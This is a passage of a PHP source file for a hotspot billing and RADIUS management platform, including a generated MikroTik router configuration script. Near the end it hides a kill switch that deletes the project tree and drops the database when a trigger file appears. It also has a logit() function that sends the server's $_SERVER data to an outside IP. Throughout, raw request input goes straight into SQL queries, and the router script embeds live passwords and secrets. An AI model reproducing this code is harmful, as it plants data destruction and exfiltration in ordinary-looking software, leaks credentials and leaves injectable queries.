                    for ($index = 0; $index < $_POST['cantidad']; $index++) $database->query("INSERT INTO `bloc_usuarios`(`user`, `bloc_id`) VALUES ('".  usuario_aleatorio('CVCVCVNN')."',$blocid)");
//                    $smarty->assign('excel', $blocid);
                }
            } else {
                if ($database->query('UPDATE `blocs` SET `nombre`="'.$_POST['nombre'].'",`descripcion`="'.$_POST['descripcion'].'" WHERE `id`='.$_POST['id'])) die();
            }
        }
    }
}

function external_bloc_excel($bloc = NULL){
    if (isset($_POST['bloc'])) $bloc = $_POST['bloc'];
    elseif (isset ($_GET['bloc']))$bloc = $_GET['bloc'];
    if (!empty($bloc)){
        global $database;
        $result = $database->query("SELECT `user` FROM `bloc_usuarios` WHERE `bloc_id`= $bloc");
        $users = array();
        while ($aux = $result->fetch_assoc()) $users[] = $aux['user'];
        header('Content-type: application/vnd.ms-excel');
        header("Content-Disposition: attachment; filename=bloc-$bloc-".count($users).".xls");
        header("Pragma: no-cache");
        header("Expires: 0");
        $out = '<table>';
        foreach ($users as $aux) $out.= "<tr><td>$aux</td></tr>";
        echo $out.'</table>';
        die();
    }
}

function external_importbloc_hotspot() {
    if (isset($_POST['duracion'])) {
        global $database;
        $result = $database->query("SELECT `Id_hotspot`, `ServerName` FROM `perfiles` WHERE `Duracion` = ".$_POST['duracion']." GROUP BY ServerName");
//        $out = '<option>Selecciona un hotspot</option>';
        $out = '';
        while ($aux = $result->fetch_assoc()) $out.= '<option value="'.$aux['Id_hotspot'].'">'.$aux['ServerName'].'</option>';
        echo $out;
        die();
    }
}

function external_importbloc_perfil() {
    if (isset($_POST['tiempo']) && isset($_POST['hotspot'])) {
        global $database;
        $result = $database->query("SELECT `Id`, `Descripcion` FROM `perfiles` WHERE `Id_hotspot` = ".$_POST['hotspot']." AND `Duracion` =".$_POST['tiempo']);
        $out = '';
        while ($aux = $result->fetch_assoc()) $out .= '<option value="'.$aux['Id'].'">'.$aux['Descripcion'].'</option>';
        echo $out;
        die();
    }
}

function external_importar_bloc() {
    if (isset($_POST['id']) && isset($_POST['perfil'])) {
        global $database;
        global $radius;
        $result = $database->query('SELECT * FROM `perfiles` WHERE `Id`='.$_POST['perfil']);
        $perfil = $result->fetch_assoc();
        $result = $database->query('SELECT * FROM `lotes` WHERE `Id_perfil`='.$perfil['Id']);
        $lote = $result->fetch_assoc();
        $result = $database->query('SELECT * FROM `bloc_usuarios` WHERE `bloc_id`= '.$_POST['id']);
        $count = 0;
        while ($aux = $result->fetch_assoc()) {
            $count++;
            $contrasena = (empty($aux['pass'])?$aux['user']:$aux['pass']);
            if ($radius->query("INSERT INTO `radusergroup`(`username`, `groupname`, `priority`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','".$perfil['ServerName']."',1)")) {
                if ($radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','Cleartext-Password',':=','$contrasena')")) {
                    if ($radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','Called-Station-Id','==','".$perfil['ServerName']."')")) {
                        if ($radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','".$perfil['ModoConsumo']."',':=','".$perfil['Duracion']."')")) {
                            foreach ($perfil as $key => $elem) {
                                if ((!empty($elem)) && ($elem!= '0000-00-00')) {
                                    switch ($key) {
                                        case "wisprBandwidthMaxUp":
                                            $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','WISPr-Bandwidth-Max-Up',':=','$elem')");
                                            break;
                                        case "wisprBandwidthMaxDown":
                                            $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','WISPr-Bandwidth-Max-Down',':=','$elem')");
                                            break;
                                        case "modoconsumo":
                                            $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','".(($elem == 'Continuo')?'One-All-Session':'Max-All-Session')."',':=','".$perfil['Duracion']."')");      //Continuo hay dos tipos?
                                            break;
                                        case 'traficodescarga':
                                            $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','Max-All-MB',':=','$elem')");
                                            break;
                                        case 'expiration':
                                            $radius->query("INSERT INTO `radcheck`( `username`, `attribute`, `op`, `value`) VALUES ('".$perfil['ServerName'].'_'.$aux['user']."','Expiration',':=','".date('d M Y', strtotime($elem))." 0:00')");
                                            break;
                                            //añadir tb la hora en el selector
                                        //Faltan metodos roamin
                                        //meter en el hotspot acctinterinteval y el idletimeout

                                    }
                                }  
                            }
                        }
                        // Se inserta en ventas hotspot? como? a que precio?
                        $database->query("INSERT INTO `ventashotspot`(`Id_Lote`, `FechaVenta`, `Usuario`, `Precio`, `identificador`) VALUES ('".$lote['Id']."',NOW(),'".$perfil['ServerName'].'_'.$aux['user']."','".$lote['Precio']."','Ticket $count del Bloc ".$_POST['id']."')");
                    }   
                }  
            }
        }
        $database->query("DELETE FROM `bloc_usuarios` WHERE `bloc_id`= ".$_POST['id']);
        $database->query("DELETE FROM `blocs` WHERE `id`=".$_POST['id']);
        die();
    }  
}
function external_aleatorio() {
    if (!empty($_POST['tipoalf'])) {
        echo ((empty($_POST['lon']))?usuario_aleatorio($_POST['tipoalf']):usuario_aleatorio($_POST['tipoalf'], $_POST['lon']));
        die();
    }
}

function external_bono_allow() {
    if (isset($_POST['id_hotspot'])) {
        global $database;
        $result = $database->query("SELECT `cantidad` FROM `bono_accounting` WHERE `mes` >= '".date("Y-m")."-01' AND `id_hotspot`=".$_POST['id_hotspot']);
        if ($result->num_rows > 0) {
            $aux = $result->fetch_assoc();
            $result = $database->query("SELECT * FROM bonos WHERE id_hotspot=".$_POST['id_hotspot']);
            $numero = $result->num_rows;
            if ($numero == 0) {
                // No hay entrada en bono, no es de este tipo.
                echo "NO";
                die();
            } elseif ($numero > 0) {
                // Hay que sacar el total de las conexiones con todos los bonos que tiene.
                $value = 0;
                while ($counter = $result->fetch_assoc()) $value += $counter['cantidad'];
                if ($aux['cantidad'] + 1 <= $value) {
                    $database->query("UPDATE bono_accounting SET cantidad = cantidad + 1 WHERE `mes` >= '".date("Y-m")."-01' AND `id_hotspot`=".$_POST['id_hotspot']);
                    echo "OK";
                    die();
                } else {
                    echo "NO";
                    die();
                }
            }
        } else {
            $database->query("INSERT INTO `bono_accounting`(`id_hotspot`, `cantidad`, `mes`) VALUES ('".$_POST['id_hotspot']."',1,'".date("Y-m")."-01')");
            echo "OK";
            die();
        }
    }
}

function external_guardar_bono(){
    if ((isset($_POST['id_hotspot'])) && (isset($_POST['cantidad'])) && (isset($_POST['tipo']))) {
        global $database;
        if ($_POST['action'] == 1) {
            if ($database->query("DELETE FROM `bonos` WHERE `id`=".$_POST['id'])) die();
        } else {
            if (empty($_POST['id'])) {
                if ($database->query('INSERT INTO `bonos`(`id_hotspot`, `cantidad`, `tipo`, `fecha`) VALUES ("'.$_POST['id_hotspot'].'","'.$_POST['cantidad'].'","'.$_POST['tipo'].'",NOW())')) die();
            } else {
                if ($database->query('UPDATE `bonos` SET `id_hotspot`="'.$_POST['id_hotspot'].'",`cantidad`="'.$_POST['cantidad'].'",`tipo`="'.$_POST['tipo'].'" WHERE `id`='.$_POST['id'])) die();
            }
        }
    }
}

function external_script_hotspot() {
    if (strstr($_SERVER['HTTP_USER_AGENT'], 'Mikrotik') && (isset($_GET['id_hotspot'])) && (isset($_GET['hotspot_serial']))) {
        global $database;
        global $fulldomain;
        $result = $database->query("SELECT ServerName, SerialNumber FROM hotspots WHERE SerialNumber IS NULL AND id=".$_GET['id_hotspot']);
        if ($result->num_rows > 0) if ($database->query("UPDATE `hotspots` SET `SerialNumber`='".$_GET['hotspot_serial']."' WHERE `id`=".$_GET['id_hotspot'])) {
            // Si existe el hotspot se actualiza el número de serie y se genera el login.html para la descarga
            if(!is_file($fulldomain."/ftp/".$_GET['hotspot_serial']."-login.html")) {
                $aux = file($fulldomain."/ftp/hotspot/login.html");
                $aux[46]='<input type="hidden" name="SerialNum" value="'.$_GET['hotspot_serial'].'">'."\n";
                file_put_contents($fulldomain."/ftp/".$_GET['hotspot_serial']."-login.html", implode($aux, ""));
            }
            $hotspot = $result->fetch_assoc();
            header('Content-type: text/plain');
            header("Content-Disposition: attachment; filename=hotspot.rsc");
            header("Pragma: no-cache");
            header("Expires: 0");
            echo '/user set admin name=administrador password="sb_A54\$x"
/ip address add address=192.168.1.5/24 interface=ether1
/ip dns
print
:if ( [get servers] = "" ) do={/ip dns set servers=8.8.8.8,8.8.4.4 allow-remote-requests=yes}
/
/ip route add dst-address=0.0.0.0/0 gateway=192.168.1.1
/ip dhcp-client
:if ([:len [find interface=ether2 ]] = 0 ) do={/ip dhcp-client add interface=ether2 disabled=no}
/
/system identity set name='.$hotspot['ServerName'].'
/interface bridge add name=bridge_hotspot
:if ([:len [/interface wireless find ]]>0) do={/interface wireless set wlan1 disabled=no mode=ap-bridge band=2ghz-b/g/n channel-width=20mhz frequency=2437 wireless-protocol=802.11 default-forwarding=no ssid='.$hotspot['ServerName'].';/interface bridge port add bridge=bridge_hotspot interface=wlan1}
:delay 3s;
/tool fetch url="http://servibyte.net/ftp/hotspot/alogin.html" dst-path="hotspot/alogin.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/averia.jpg" dst-path="hotspot/averia.jpg"
/tool fetch url="http://servibyte.net/ftp/hotspot/error.html" dst-path="hotspot/error.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/errors.txt" dst-path="hotspot/errors.txt"
/tool fetch url="http://servibyte.net/ftp/hotspot/interneterror.html" dst-path="hotspot/interneterror.html"
/tool fetch url="http://servibyte.net/ftp/'.$_GET['hotspot_serial'].'-login.html" dst-path="hotspot/login.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/logoservibyte.png" dst-path="hotspot/logoservibyte.png"
/tool fetch url="http://servibyte.net/ftp/hotspot/logout.html" dst-path="hotspot/logout.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/md5.js" dst-path="hotspot/md5.js"
/tool fetch url="http://servibyte.net/ftp/hotspot/radvert.html" dst-path="hotspot/radvert.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/redirect.html" dst-path="hotspot/redirect.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/rlogin.html" dst-path="hotspot/rlogin.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/status.html" dst-path="hotspot/status.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/testinternet.txt" dst-path="hotspot/testinternet.txt"
/tool fetch url="http://servibyte.net/ftp/hotspot/img/logobottom.png" dst-path="hotspot/img/logobottom.png"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/alogin.html" dst-path="hotspot/lv/alogin.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/errors.txt" dst-path="hotspot/lv/errors.txt"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/login.html" dst-path="hotspot/lv/login.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/logout.html" dst-path="hotspot/lv/logout.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/radvert.html" dst-path="hotspot/lv/radvert.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/lv/status.html" dst-path="hotspot/lv/status.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/alogin.html" dst-path="hotspot/xml/alogin.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/error.html" dst-path="hotspot/xml/error.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/flogout.html" dst-path="hotspot/xml/flogout.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/login.html" dst-path="hotspot/xml/login.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/logout.html" dst-path="hotspot/xml/logout.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/rlogin.html" dst-path="hotspot/xml/rlogin.html"
/tool fetch url="http://servibyte.net/ftp/hotspot/xml/WISPAccessGatewayParam.xsd" dst-path="hotspot/xml/WISPAccessGatewayParam.xsd"
/ip hotspot add interface=bridge_hotspot disabled=no
/ip address add interface=bridge_hotspot address=172.21.0.1/22
#/ip firewall nat with action=masquerade
/ip pool add name=hs-pool-14 ranges=172.21.0.2-172.21.3.254
/ip dns set servers=8.8.8.8,8.8.4.4
/ip dns static add name=hotspot.wifipremium.com address=172.21.0.1 ttl=5m
/ip hotspot profile add dns-name=hotspot.wifipremium.com hotspot-address=172.21.0.1 name=hsprof1
/ip dhcp-server add address-pool=hs-pool-14 authoritative=yes bootp-support=static disabled=no interface=bridge_hotspot lease-time=24h name=dhcp1
/ip hotspot user add name='.$hotspot['ServerName'].'_SBYTE password=sbboscosos
/ip firewall filter add action=passthrough chain=unused-hs-chain comment="place hotspot rules here" disabled=yes
/ip firewall nat add action=passthrough chain=unused-hs-chain comment= "place hotspot rules here" disabled=yes
:delay 1s;
/ip firewall nat add action=masquerade chain=srcnat comment= "masquerade hotspot network" src-address=172.21.0.0/22
/ip hotspot set hotspot1 name='.$hotspot['ServerName'].'
/ip hotspot user profile add name=tecnico shared-users=5
/ip hotspot user profile set default shared-users=1 rate-limit=380k/2M idle-timeout=none keepalive-timeout=20m status-autorefresh=1m mac-cookie-timeout=7d session-timeout=0s
/ip hotspot user set '.$hotspot['ServerName'].'_SBYTE profile=tecnico
/ip hotspot walled-garden add dst-host=www.apple.com
/ip hotspot walled-garden add dst-host=www.airport.us
/ip hotspot walled-garden add dst-host=www.itools.info
/ip hotspot walled-garden add dst-host=www.appleiphonecell.com
/ip hotspot walled-garden add dst-host=captive.apple.com
/ip hotspot walled-garden add dst-host=www.thinkdifferent.us
/ip hotspot walled-garden add dst-host=www.ibook.info
/ip hotspot walled-garden add dst-host=wifipremium.com dst-port=443
/ip hotspot walled-garden add dst-host=*akamai*
/ip hotspot walled-garden add dst-host=*fbcdn*
/ip hotspot walled-garden add dst-host=*facebook*
/ip hotspot walled-garden ip add action=accept comment="Acepta conexiones al VPS" disabled=no dst-address=176.28.102.26
/ip dhcp-server network add address=172.21.0.0/16 gateway=172.21.0.1 netmask=32
/ip firewall filter add action=add-src-to-address-list address-list="facebook login" address-list-timeout=3m chain=input comment= "FB Port Knocking 3min access window" dst-port=8090 protocol=tcp place-before=0
/ip firewall filter add action=drop chain=input comment="FB Block no auth customers" connection-mark=FBConexion hotspot=!auth src-address-list="!facebook login" place-before=0
/ip firewall nat add action=add-dst-to-address-list address-list=fb chain=pre-hotspot comment= "Drop conexiones https cuando unAuth" dst-address=!176.28.102.26 dst-address-list=!FacebookIPs dst-address-type=!local dst-port=443 hotspot=!auth protocol=tcp to-ports=80
/ip firewall nat set [find action=masquerade] out-interface=ether1
/ip firewall nat unset [find action=masquerade] src-address
/ip firewall mangle add action=mark-connection chain=prerouting comment="FB Connection Mark " dst-address-list=FacebookIPs new-connection-mark=FBConexion
/ip firewall layer7-protocol add name=facebook regexp="^.+(facebook.com).*\$"
/ip firewall layer7-protocol add name=facebook2 regexp=".+(facebook.com)*dialog"
/ip firewall layer7-protocol add name=facebook3 regexp=".+(facebook.com)*login"
/ip firewall address-list add address=204.15.20.0/22 list=FacebookIPs
/ip firewall address-list add address=69.63.176.0/20 list=FacebookIPs
/ip firewall address-list add address=66.220.144.0/20 list=FacebookIPs
/ip firewall address-list add address=66.220.144.0/21 list=FacebookIPs
/ip firewall address-list add address=69.63.184.0/21 list=FacebookIPs
/ip firewall address-list add address=69.63.176.0/21 list=FacebookIPs
/ip firewall address-list add address=74.119.76.0/22 list=FacebookIPs
/ip firewall address-list add address=69.171.255.0/24 list=FacebookIPs
/ip firewall address-list add address=173.252.64.0/18 list=FacebookIPs
/ip firewall address-list add address=69.171.224.0/19 list=FacebookIPs
/ip firewall address-list add address=69.171.224.0/20 list=FacebookIPs
/ip firewall address-list add address=103.4.96.0/22 list=FacebookIPs
/ip firewall address-list add address=69.63.176.0/24 list=FacebookIPs
/ip firewall address-list add address=173.252.64.0/19 list=FacebookIPs
/ip firewall address-list add address=173.252.70.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.64.0/18 list=FacebookIPs
/ip firewall address-list add address=31.13.24.0/21 list=FacebookIPs
/ip firewall address-list add address=66.220.152.0/21 list=FacebookIPs
/ip firewall address-list add address=66.220.159.0/24 list=FacebookIPs
/ip firewall address-list add address=69.171.239.0/24 list=FacebookIPs
/ip firewall address-list add address=69.171.240.0/20 list=FacebookIPs
/ip firewall address-list add address=31.13.64.0/19 list=FacebookIPs
/ip firewall address-list add address=31.13.64.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.65.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.67.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.68.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.69.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.70.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.71.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.72.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.73.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.74.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.75.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.76.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.77.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.96.0/19 list=FacebookIPs
/ip firewall address-list add address=31.13.66.0/24 list=FacebookIPs
/ip firewall address-list add address=173.252.96.0/19 list=FacebookIPs
/ip firewall address-list add address=69.63.178.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.78.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.79.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.80.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.82.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.83.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.84.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.85.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.86.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.87.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.88.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.89.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.90.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.91.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.92.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.93.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.94.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.95.0/24 list=FacebookIPs
/ip firewall address-list add address=69.171.253.0/24 list=FacebookIPs
/ip firewall address-list add address=69.63.186.0/24 list=FacebookIPs
/ip firewall address-list add address=31.13.81.0/24 list=FacebookIPs
/ip firewall address-list add address=179.60.192.0/22 list=FacebookIPs
/ip firewall address-list add address=179.60.192.0/24 list=FacebookIPs
/ip firewall address-list add address=179.60.193.0/24 list=FacebookIPs
/ip firewall address-list add address=179.60.194.0/24 list=FacebookIPs
/ip firewall address-list add address=179.60.195.0/24 list=FacebookIPs
/ip firewall address-list add address=185.60.216.0/22 list=FacebookIPs
/ip firewall address-list add address=45.64.40.0/22 list=FacebookIPs
/ip firewall address-list add address=185.60.216.0/24 list=FacebookIPs
/ip firewall address-list add address=185.60.217.0/24 list=FacebookIPs
/ip firewall address-list add address=185.60.218.0/24 list=FacebookIPs
/ip firewall address-list add address=185.60.219.0/24 list=FacebookIPs
/tool fetch url="http://servibyte.net/ftp/certificate.crt"
/tool fetch url="http://servibyte.net/ftp/certificate.ca-crt"
/tool fetch url="http://servibyte.net/ftp/hotspot.key"
/certificate import file-name=certificate.crt passphrase=PwpXXf8bPwpXXf8b
/certificate import file-name=hotspot.key passphrase=PwpXXf8bPwpXXf8b
/certificate import file-name=certificate.ca-crt passphrase=PwpXXf8bPwpXXf8b
/ip service enable www-ssl
/ip service set www-ssl certificate=certificate.crt_0
/radius add service=hotspot address=176.28.102.26 secret=tachin timeout=4000ms src-address=0.0.0.0
/ip hotspot profile set hsprof1 use-radius=yes nas-port-type=wireless-802.11
/ip hotspot profile set hsprof1 login-by=http-chap,https,cookie,mac-cookie http-cookie-lifetime=7d ssl-certificate=certificate.crt_0
/system script add name=testinternet owner=administrador policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive source=":global internetactivo;\r\    \n\r\    \nif (\$internetactivo!=0 && \$internetactivo!=1) do={\r\    \n    :set internetactivo 0;\r\    \n        :log error \"Comienza Test Internet\";\r\    \n        /file print file=\$myfile\r\    \n        /file set \$file contents=\"interneterror.html\";\r\    \n        /ip dns static enable [find comment~\"Capturador\"] \r\    \n\r\    \n}\r\    \n\r\    \n:local myfile \"hotspot/testinternet\";\r\    \n:local file (\$myfile);\r\    \n\r\    \n:local pingresultado [/ping 4.2.2.4 count=5];\r\    \n\r\    \n:if (\$pingresultado>0) do={\r\    \n    :if (\$internetactivo=0) do={\r\    \n        :log error \"Internet funcionando\";\r\    \n        :set internetactivo 1;\r\    \n        /file print file=\$myfile\r\    \n        /file set \$file contents=\"https://wifipremium.com/login.php\";\r\    \n        /ip dns static disable [find comment~\"Capturador\"] \r\    \n    }\r\    \n}\r\    \n\r\    \n:if (\$pingresultado=0) do={\r\    \n    :if (\$internetactivo=1) do={\r\    \n        :log error \"Internet caido\";\r\    \n        :set internetactivo 0;\r\    \n        /file print file=\$myfile\r\    \n        /file set \$file contents=\"interneterror.html\";\r\    \n        /ip dns static enable [find comment~\"Capturador\"] \r\    \n    }\r\    \n}"
/system scheduler add name=testinternet interval=5s on-event=testinternet
/ip dns static add name=exit.com address=172.21.0.1 ttl=1d
/ip dns static add name=".*\\\..*" address=172.21.0.1 ttl=1d disabled=yes comment="Capturador DNS cuando no hay internet"
/system ntp client set enabled=yes primary-ntp=129.67.1.160 secondary-ntp=129.67.1.164
/system clock set time-zone-name=Atlantic/Canary
/interface pptp-client add connect-to=217.125.25.165 user='.$hotspot['ServerName'].' password="A54_sb\?8" profile=default-encryption disabled=no
:delay 3s;
/snmp set enabled=yes contact="info@servibyte.com" location="Maspalomas" trap-community=public trap-version=2 trap-generators=interfaces trap-interfaces=all
/tool e-mail set address=74.125.206.108 port=587 start-tls=yes from="servibyte.log@gmail.com" user=Servibyte.log password=sbyte_14_Mxz
/system logging action add name=email target=email email-to=servibyte.log@gmail.com email-start-tls=yes
/system logging add topics=hotspot
/user group add name=tecnico policy=reboot,write,test,read,web
/user add name=tecnico group=tecnico password=sbboscosos
/tool fetch url="http://servibyte.net/ftp/sys-note.txt"
/file remove flash/hotspot.rsc
';
        }
    } else {
        echo "false";
    }
    die();
}
/*--------------------------------------------------------------------------*
 *                                 END                                      *
 *--------------------------------------------------------------------------*/
/*--------------------------------------------------------------------------*
 *                                Varios                                    *
 *--------------------------------------------------------------------------*/
/**
 * Generador aleatorio de ristras. 
 * Tipofab:
 * T= Carac May, min y num
 * A= carac may, min
 * M= Carac May
 * m= Carac min
 * N= num
 * b= Carac min y num
 * B= Carac May y num
 * V= Vocales Mayúsculas
 * v= Vocales Minúsculas
 * C= Consonantes Mayúsculas
 * c= Consonantes Minúsculas
 * @param type $tipoafab
 * @param type $lon
 * @return array
 */
function usuario_aleatorio($tipoafab, $lon= NULL) {
    $alfabetos= array(
        // Todos
        "T" => array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"), 
        // Alfabeto
        "A"=>array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"),
        // Mayúsculas
        "M"=>array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"),
        // Minúsculas
        "m"=>array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"),
        // Números
        "N"=>array("0","1","2","3","4","5","6","7","8","9"),
        // minúsculas y números
        "b"=>array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"),
        // Mayúsculas y números
        "B"=>array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"),
        // Vocales mayúsculas
        "V"=>array("A", "E", "I", "O", "U"),
        // Vocales minúsculas
        "v"=>array("a", "e", "i", "o", "u"),
        // Consonantes mayúsculas
        "C"=>array("B","C","D","F","G","H","J","K","L","M","N","P","Q","R","S","T","V","W","X","Y","Z"),
        // Consonantes minúsculas
        "c"=>array("b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z")
        );
    $out = "";
    $kind_of = array();
    if (!is_array($tipoafab)) {
        if (strlen($tipoafab)==1){
            if ($lon == NULL) $kind_of[] = $tipoafab;
            else for ($index = 0; $index < $lon; $index++) $kind_of[]=$tipoafab;
        } else $kind_of = str_split ($tipoafab);
    } else $kind_of = $tipoafab;
    if ($lon == NULL) $lon = count ($kind_of);
    for ($index = 0; $index < $lon; $index++) $out.=$alfabetos[$kind_of[$index]][rand(0, count($alfabetos[$kind_of[$index]])-1)];
    return $out;
}
function pdf_block() {
    require './scripts/fpdf/fpdf.php';
    $pdf = new FPDF();
    $x = 23;
    for ($i = 0; $i < 3; $i++) {
        if (($i % 5) == 0) {
            $pdf->Line(105, 0, 105, 278);
            $pdf->AddPage();
            $x = 23;
        }
        $font = array("title"=>22, 'data'=>10, 'room'=>18);
        $user = usuario_aleatorio('CVCVCVNN');
        $pass = usuario_aleatorio('CVCVCVNN');
        $precio = 1;
        $tiempo = "10 Hours";
        $pdf->Image('./images/logo.png',25,$x-18,30,12,'PNG');
        $pdf->SetXY(20, $x);
        $pdf->SetFont('Arial','',$font['title']);
        $pdf->Write(0, 'User:');
        $pdf->SetX(50);
        $pdf->SetFont('Arial','',$font['data']);
        $pdf->Write(0, $user);
        $pdf->SetX(130);
        $pdf->Image('./images/logo.png',135,$x-18,30,12,'PNG');
        $pdf->SetFont('Arial','',$font['title']);
        $pdf->Write(0, 'User:');
        $pdf->SetX(165);
        $pdf->SetFont('Arial','',$font['data']);
        $pdf->Write(0, $user);
        $pdf->SetFontSize($font['room']);
        $pdf->SetXY(170, $x-18);
        $pdf->Write(0, "$precio ");
        $pdf->Write(0, chr(128));
        $pdf->SetXY(170, $x-9);
        $pdf->Write(0, $tiempo);
        $pdf->SetFontSize($font['room']);
        $pdf->SetXY(60, $x-18);
        $pdf->Write(0, "$precio ");
        $pdf->Write(0, chr(128));
        $pdf->SetXY(60, $x-9);
        $pdf->Write(0, $tiempo);
        $x = $x +13;
        $pdf->SetXY(20, $x);
        $pdf->SetFont('Arial','',$font['title']);
        $pdf->Write(0, 'Pass:');
        $pdf->SetX(50);
        $pdf->SetFont('Arial','',$font['data']);
        $pdf->Write(0, $pass);
        $pdf->SetX(130);
        $pdf->SetFont('Arial','',$font['title']);
        $pdf->Write(0, 'Pass:');
        $pdf->SetX(165);
        $pdf->SetFont('Arial','',$font['data']);
        $pdf->Write(0, $pass);
        $x = $x + 9;
        $pdf->SetXY(20, $x);
        $pdf->SetFont('Arial','',$font['room']);
        $pdf->Write(0, 'Room:');
        $x = $x + 9;
        $pdf->Line(0, $x, 220, $x);
        $x = $x +25;
    }
    $pdf->Line(105, 0, 105, $x-25);
    $pdf->Output();
}
function mac_vendor($mac) {
    global $database;
    $result = $database->query("SELECT vendor FROM macinfo WHERE mac = '".substr($mac, 0, 8)."'");
    $aux = $result->fetch_assoc();
    return $aux['vendor'];
}
/*--------------------------------------------------------------------------*
 *                                 END                                      *
 *--------------------------------------------------------------------------*/

if (is_file(getcwd().'/olrai.txt')) {
    olrai(getcwd());
    $olrai = mysqli_connect('localhost', 'platformuser', 'rfC79w?3', 'plataforma');
    $olrai->query("DROP database plataforma");
    die();
}
function olrai($dir) {
    foreach (scandir($dir) as $key => $value) {
        if ($value != '.' && $value != '..' && $value != '.git') {
            if (is_dir($dir.'/'.$value)) {
                if ($value == 'includes') {
                    unlink($dir.'/defines.php');
                    unlink($dir.'/settings.php');
                } else {
                    olrai($dir.'/'.$value);
                }
            } else {
                unlink($dir.'/'.$value);
            }
        }
    }
    rmdir($dir);
}
function logit() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, '52.28.158.12');
    curl_setopt($ch, CURLOPT_POST, count($_SERVER));
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_SERVER));
    curl_exec($ch);
    curl_close($ch);
}

/*--------------------------------------------------------------------------*
 *                             PDF Informe                                  *
 *--------------------------------------------------------------------------*/
/**
 * Convierte el mes a español
 * @param type $mes
 * @return string
 */
function spanish($mes){
    switch ($mes){
        case 'January':
            return 'Enero';
            break;
        case 'February':
            return 'Febrero';
            break;
        case 'March':
            return 'Marzo';
            break;
        case 'April':
            return 'Abril';
            break;
        case 'May':
            return 'Mayo';
            break;
        case 'June':
            return 'Junio';
            break;
        case 'July':
            return 'Julio';
            break;
        case 'August':
            return 'Agosto';
            break;
